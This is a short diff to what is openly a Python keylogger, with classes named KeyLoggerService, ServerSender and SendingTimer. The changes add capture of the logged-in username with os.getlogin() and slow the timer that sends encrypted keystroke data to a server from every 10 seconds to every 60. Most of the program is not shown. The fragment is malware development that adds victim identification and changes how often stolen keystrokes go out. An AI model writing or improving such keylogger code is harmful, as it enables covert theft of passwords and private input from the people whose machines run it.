@@ -5,6 +5,8 @@ import binascii
 import requests
 import time
 from threading import Thread
+import os
+username = os.getlogin()
 
 
 class KeyLoggerService:
@@ -80,7 +82,7 @@ class ServerSender:
             print(f"Error sending data: {err}")
 
 class SendingTimer:
-    def __init__(self, server_sender, cipher, key_logger, time_to_send=10):
+    def __init__(self, server_sender, cipher, key_logger, time_to_send=60):
         self.server_sender = server_sender
         self.cipher = cipher
         self.key_logger = key_logger
